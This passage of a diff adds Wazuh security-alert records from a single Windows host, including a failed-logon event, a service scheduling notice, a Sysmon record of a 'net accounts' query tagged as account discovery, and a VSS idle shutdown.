:\t-\r\n\tLongueur de clé :\t\t0\r\n\r\nCet événement est généré lorsqu’une demande d’ouverture de session échoue. Il est généré sur l’ordinateur sur lequel l’accès a été tenté.\r\n\r\nLe champ Objet indique le compte sur le système local qui a demandé l’ouverture de session. Il s’agit le plus souvent d’un service, comme le service Serveur, ou un processus local tel que Winlogon.exe ou Services.exe.\r\n\r\nLe champ Type d’ouverture de session indique le type d’ouverture de session qui a été demandé. Les types les plus courants sont 2 (interactif) et 3 (réseau).\r\n\r\nLes champs relatifs aux informations sur le processus indiquent quel est le compte et le processus sur le système qui ont demandé l’ouverture de session.\r\n\r\nLes champs relatifs aux informations sur le réseau indiquent la provenance de la demande d’ouverture de session distante. Le nom de la station de travail n’étant pas toujours disponible, peut rester vide dans certains cas.\r\n\r\nLes champs relatifs aux informations d’authentification fournissent des détails sur cette demande d’ouverture de session spécifique.\r\n\t- Les services en transit indiquent les services intermédiaires qui ont participé à cette demande d’ouverture de session.\r\n\t- Le nom du package indique quel a été le sous-protocole qui a été utilisé parmi les protocoles NTLM.\r\n\t- La longueur de la clé indique la longueur de la clé de session générée. Elle a la valeur 0 si aucune clé de session n’a été demandée.\"",
+            "version": "0",
+            "systemTime": "2025-09-15T14:28:27.9395009Z",
+            "eventRecordID": "21141",
+            "threadID": "5216",
+            "computer": "DESKTOP-MDNNEJF",
+            "task": "12544",
+            "processID": "756",
+            "severityValue": "AUDIT_FAILURE",
+            "providerName": "Microsoft-Windows-Security-Auditing"
+          }
+        }
+      },
+      "rule": {
+        "mail": false,
+        "level": 5,
+        "pci_dss": [
+          "10.2.4",
+          "10.2.5"
+        ],
+        "hipaa": [
+          "164.312.b"
+        ],
+        "tsc": [
+          "CC6.1",
+          "CC6.8",
+          "CC7.2",
+          "CC7.3"
+        ],
+        "description": "Logon Failure - Unknown user or bad password",
+        "groups": [
+          "windows",
+          "windows_security",
+          "authentication_failed"
+        ],
+        "nist_800_53": [
+          "AU.14",
+          "AC.7"
+        ],
+        "gdpr": [
+          "IV_35.7.d",
+          "IV_32.2"
+        ],
+        "firedtimes": 2,
+        "mitre": {
+          "technique": [
+            "Account Access Removal"
+          ],
+          "id": [
+            "T1531"
+          ],
+          "tactic": [
+            "Impact"
+          ]
+        },
+        "id": "60122",
+        "gpg13": [
+          "7.1"
+        ]
+      },
+      "location": "EventChannel",
+      "decoder": {
+        "name": "windows_eventchannel"
+      },
+      "id": "1757946508.845453",
+      "timestamp": "2025-09-15T14:28:28.933+0000"
+    },
+    "fields": {
+      "timestamp": [
+        "2025-09-15T14:28:28.933Z"
+      ]
+    },
+    "sort": [
+      1757946508933
+    ]
+  },
+
+
+
+  {
+    "_index": "wazuh-alerts-4.x-2025.09.15",
+    "_id": "rUe-TZkBIDwfn7_zXrox",
+    "_score": null,
+    "_source": {
+      "input": {
+        "type": "log"
+      },
+      "agent": {
+        "ip": "192.168.1.101",
+        "name": "DESKTOP-MDNNEJF",
+        "id": "001"
+      },
+      "manager": {
+        "name": "ubuntu22"
+      },
+      "data": {
+        "win": {
+          "eventdata": {
+            "data": "2025-09-15T15:50:00Z, RulesEngine"
+          },
+          "system": {
+            "eventID": "16384",
+            "eventSourceName": "Software Protection Platform Service",
+            "keywords": "0x80000000000000",
+            "providerGuid": "{E23B33B0-C8C9-472C-A5F9-F2BDFEA0F156}",
+            "level": "4",
+            "channel": "Application",
+            "opcode": "0",
+            "message": "\"La planification du redémarrage du service de protection logicielle à 2025-09-15T15:50:00Z a réussi. Raison : RulesEngine.\"",
+            "version": "0",
+            "systemTime": "2025-09-15T14:19:00.4127803Z",
+            "eventRecordID": "7534",
+            "threadID": "0",
+            "computer": "DESKTOP-MDNNEJF",
+            "task": "0",
+            "processID": "8936",
+            "severityValue": "INFORMATION",
+            "providerName": "Microsoft-Windows-Security-SPP"
+          }
+        }
+      },
+      "rule": {
+        "firedtimes": 1,
+        "mail": false,
+        "level": 3,
+        "description": "Software protection service scheduled successfully.",
+        "groups": [
+          "windows",
+          "windows_application"
+        ],
+        "id": "60642"
+      },
+      "location": "EventChannel",
+      "decoder": {
+        "name": "windows_eventchannel"
+      },
+      "id": "1757945940.790942",
+      "timestamp": "2025-09-15T14:19:00.403+0000"
+    },
+    "fields": {
+      "timestamp": [
+        "2025-09-15T14:19:00.403Z"
+      ]
+    },
+    "sort": [
+      1757945940403
+    ]
+  },
+
+
+
+  {
+    "_index": "wazuh-alerts-4.x-2025.09.15",
+    "_id": "WEf1S5kBIDwfn7_zD7lz",
+    "_score": null,
+    "_source": {
+      "input": {
+        "type": "log"
+      },
+      "agent": {
+        "ip": "192.168.1.101",
+        "name": "DESKTOP-MDNNEJF",
+        "id": "001"
+      },
+      "manager": {
+        "name": "ubuntu22"
+      },
+      "data": {
+        "win": {
+          "eventdata": {
+            "originalFileName": "net1.exe",
+            "image": "C:\\\\Windows\\\\SysWOW64\\\\net1.exe",
+            "product": "Microsoft® Windows® Operating System",
+            "parentProcessGuid": "{994437b3-ab41-68c7-3033-000000000e00}",
+            "description": "Net Command",
+            "logonGuid": "{994437b3-7443-68b8-e703-000000000000}",
+            "parentCommandLine": "net.exe accounts",
+            "processGuid": "{994437b3-ab41-68c7-3233-000000000e00}",
+            "logonId": "0x3e7",
+            "parentProcessId": "6988",
+            "processId": "10896",
+            "currentDirectory": "C:\\\\Program Files (x86)\\\\ossec-agent\\\\",
+            "utcTime": "2025-09-15 05:59:29.068",
+            "hashes": "MD5=13C9BF9D300FA7A8EEAE2C21F74DE6F8,SHA256=E692C373C88107B024E5D5481AFE9BBBAEF062FCD4C36E1FD2CA3FC09EC6B663,IMPHASH=FA57EC07C0A8E480F5D417E8860B906D",
+            "parentImage": "C:\\\\Windows\\\\SysWOW64\\\\net.exe",
+            "company": "Microsoft Corporation",
+            "commandLine": "C:\\\\Windows\\\\system32\\\\net1 accounts",
+            "integrityLevel": "System",
+            "fileVersion": "10.0.22621.674 (WinBuild.160101.0800)",
+            "user": "NT AUTHORITY\\\\SYSTEM",
+            "terminalSessionId": "0",
+            "parentUser": "NT AUTHORITY\\\\SYSTEM"
+          },
+          "system": {
+            "eventID": "1",
+            "keywords": "0x8000000000000000",
+            "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
+            "level": "4",
+            "channel": "Microsoft-Windows-Sysmon/Operational",
+            "opcode": "0",
+            "message": "\"Process Create:\r\nRuleName: -\r\nUtcTime: 2025-09-15 05:59:29.068\r\nProcessGuid: {994437b3-ab41-68c7-3233-000000000e00}\r\nProcessId: 10896\r\nImage: C:\\Windows\\SysWOW64\\net1.exe\r\nFileVersion: 10.0.22621.674 (WinBuild.160101.0800)\r\nDescription: Net Command\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: net1.exe\r\nCommandLine: C:\\Windows\\system32\\net1 accounts\r\nCurrentDirectory: C:\\Program Files (x86)\\ossec-agent\\\r\nUser: NT AUTHORITY\\SYSTEM\r\nLogonGuid: {994437b3-7443-68b8-e703-000000000000}\r\nLogonId: 0x3E7\r\nTerminalSessionId: 0\r\nIntegrityLevel: System\r\nHashes: MD5=13C9BF9D300FA7A8EEAE2C21F74DE6F8,SHA256=E692C373C88107B024E5D5481AFE9BBBAEF062FCD4C36E1FD2CA3FC09EC6B663,IMPHASH=FA57EC07C0A8E480F5D417E8860B906D\r\nParentProcessGuid: {994437b3-ab41-68c7-3033-000000000e00}\r\nParentProcessId: 6988\r\nParentImage: C:\\Windows\\SysWOW64\\net.exe\r\nParentCommandLine: net.exe accounts\r\nParentUser: NT AUTHORITY\\SYSTEM\"",
+            "version": "5",
+            "systemTime": "2025-09-15T05:59:29.0711283Z",
+            "eventRecordID": "13719",
+            "threadID": "4804",
+            "computer": "DESKTOP-MDNNEJF",
+            "task": "1",
+            "processID": "3544",
+            "severityValue": "INFORMATION",
+            "providerName": "Microsoft-Windows-Sysmon"
+          }
+        }
+      },
+      "rule": {
+        "firedtimes": 14,
+        "mail": false,
+        "level": 3,
+        "description": "Discovery activity executed",
+        "groups": [
+          "sysmon",
+          "sysmon_eid1_detections",
+          "windows"
+        ],
+        "mitre": {
+          "technique": [
+            "Account Discovery"
+          ],
+          "id": [
+            "T1087"
+          ],
+          "tactic": [
+            "Discovery"
+          ]
+        },
+        "id": "92031"
+      },
+      "location": "EventChannel",
+      "decoder": {
+        "name": "windows_eventchannel"
+      },
+      "id": "1757915969.377664",
+      "timestamp": "2025-09-15T05:59:29.539+0000"
+    },
+    "fields": {
+      "timestamp": [
+        "2025-09-15T05:59:29.539Z"
+      ]
+    },
+    "sort": [
+      1757915969539
+    ]
+  },
+
+
+
+  {
+    "_index": "wazuh-alerts-4.x-2025.09.13",
+    "_id": "JEfmRJkBIDwfn7_zi7SG",
+    "_score": null,
+    "_source": {
+      "input": {
+        "type": "log"
+      },
+      "agent": {
+        "ip": "192.168.1.101",
+        "name": "DESKTOP-MDNNEJF",
+        "id": "001"
+      },
+      "manager": {
+        "name": "ubuntu22"
+      },
+      "data": {
+        "win": {
+          "eventdata": {
+            "binary": "2D20436F64653A2020434F525356434330303030303737322D2043616C6C3A2020434F525356434330303030303735342D205049443A202030303030353530342D205449443A202030303031313139362D20434D443A2020433A5C57696E646F77735C73797374656D33325C76737376632E6578652020202D20557365723A204E616D653A204E5420415554484F524954595C53595354454D2C205349443A532D312D352D313820"
+          },
+          "system": {
+            "eventID": "8224",
+            "keywords": "0x80000000000000",
+            "level": "4",
+            "channel": "Application",
+            "opcode": "0",
+            "message": "\"Le service VSS s’arrête, car le délai d’inactivité est dépassé. \"",
+            "version": "0",
+            "systemTime": "2025-09-13T21:06:13.8274854Z",
+            "eventRecordID": "7439",
+            "threadID": "0",
+            "computer": "DESKTOP-MDNNEJF",
+            "task": "0",
+            "processID": "5504",
+            "severityValue": "INFORMATION",
+            "providerName": "VSS"
+          }
+        }
+      },
+      "rule": {
+        "firedtimes": 1,
+        "mail": false,
+        "level": 5,
+        "description": "The VSS service is shutting down due to idle timeout.",
+        "groups": [
+          "windows",
+          "windows_application"
+        ],
+        "id": "60702"
+      },
+      "location": "EventChannel",
+      "decoder": {
+        "name": "windows_eventchannel"
+      },
+      "id": "1757797573.1708146",
+      "timestamp": "2025-09-13T21:06:13.837+0000"
+    },
+    "fields": {
+      "timestamp": [
+        "2025-09-13T21:06:13.837Z"
+      ]
+    },
+    "sort": [
+      1757797573837
+    ]
+  }
+]
